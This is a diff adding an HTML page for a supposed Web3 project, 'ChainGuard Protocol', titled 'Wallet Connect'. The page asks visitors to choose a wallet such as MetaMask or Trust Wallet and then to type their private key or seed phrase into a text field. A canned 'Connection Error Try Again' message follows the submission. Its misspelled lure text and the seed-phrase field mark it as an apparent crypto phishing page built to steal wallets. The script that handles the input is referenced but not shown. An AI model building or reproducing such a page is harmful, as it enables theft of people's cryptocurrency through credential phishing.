@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Connect</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <!-- Particles.js -->
+    <script src="https://cdn.jsdelivr.net/npm/tsparticles@2.11.1/tsparticles.bundle.min.js"></script>
+
+</head>
+
+<body>
+
+    <!-- Floating Web3 icons -->
+    <div id="tsparticles"></div>
+    <div class="web3-float">
+        <img src="assets/eth.svg" class="eth" alt="">
+        <img src="assets/polygon.svg" class="polygon" alt="">
+        <img src="assets/bsc.svg" class="bsc" alt="">
+    </div>
+    <!-- ================= FLOATING PARTICLES / HERO BACKGROUND ================= -->
+
+    <!-- Header -->
+    <header>
+        <div class="header-container">
+            <div id="wallet-pill" class="wallet-pill hidden">
+                <span class="wallet-dot"></span>
+                <span id="wallet-short"></span>
+            </div>
+
+            <div class="logo-container">
+                <img src="logo.png" alt="ChainGuard Protocol Logo" class="logo" />
+                <h1>ChainGuard Protocol</h1>
+            </div>
+
+            <nav class="nav-menu">
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="index.html#features">Features</a></li>
+                    <li><a href="index.html#about">About</a></li>
+                    <li><a href="index.html#contact">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Wallet Section -->
+    <section class="connect-wallet-section wallet-interface">
+        <h2>Connect Wallet</h2>
+        <p>Safely connect your wallet by selecting your wallet type and enter your crendentials for exclusive acesss and
+            more!!!</p>
+
+        <!-- Wallet Type Dropdown -->
+        <div class="wallet-actions">
+            <select id="walletType">
+                <option value="" disabled selected>Select Wallet Type</option>
+                <option value="metamask">MetaMask</option>
+                <option value="coinbase">Coinbase</option>
+                <option value="trust">Trust Wallet</option>
+                <option value="okx">OKX</option>
+                <option value="safepal">SafePal</option>
+            </select>
+        </div>
+
+        <!-- Private Key / Seed Phrase Input -->
+        <div id="manualBox" class="manual-box hidden">
+            <input type="text" id="manualAddress" placeholder="Enter Private Key or Seed Phrase" />
+            <button id="manualConnect" class="cta-button">Connect Wallet</button>
+        </div>
+
+        <!-- Wallet Info Display -->
+        <div id="walletInfo" class="wallet-info hidden">
+            <p><strong>Connection Error Try Again</strong></p>
+
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        &copy; 2026 My Web3 App. All rights reserved.
+    </footer>
+
+    <!-- JS -->
+    <script src="js/wallet.js"></script>
+    <script src="js/scroll.js"></script>
+
+</body>
+
+</html>
